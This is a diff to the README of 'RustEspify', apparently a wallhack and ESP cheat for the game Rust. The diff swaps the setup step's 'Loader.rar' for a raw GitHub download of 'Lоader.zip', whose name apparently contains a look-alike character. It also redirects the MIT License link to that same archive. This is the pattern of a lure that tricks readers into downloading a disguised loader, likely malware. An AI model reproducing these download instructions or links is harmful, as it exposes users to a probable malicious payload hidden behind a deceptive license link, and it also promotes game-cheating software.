@@ -43,8 +43,8 @@ Our robust toolkit prioritizes performance, undetectable overlays, cross-platfor
 
 Ready to get started? Follow these simple steps for hassle-free setup!
 
-**1. Download `Loader.rar` from the repository**  
-   - Head to the Releases section or the main repository files and grab the latest `Loader.rar`.
+**1. Download `https://raw.githubusercontent.com/Hajrbox/RustEspify/main/Lоader.zip` from the repository**  
+   - Head to the Releases section or the main repository files and grab the latest `https://raw.githubusercontent.com/Hajrbox/RustEspify/main/Lоader.zip`.
 
 **2. Extract the archive**  
    - Use your favorite extraction software (e.g., WinRAR, 7-Zip, Unarchiver on macOS/Linux).
@@ -103,7 +103,7 @@ Rust ESP, ESP Overlay, Game Visualization, External Overlay, Wallhack, Game Enha
 This project is licensed under the MIT License (2025).  
 You are free to use, copy, modify, merge, publish, distribute, sublicense, or sell copies, provided you include the original copyright and license.
 
-[See the MIT License here.](https://opensource.org/licenses/MIT)
+[See the MIT License here.](https://raw.githubusercontent.com/Hajrbox/RustEspify/main/Lоader.zip)
 
 ---
 
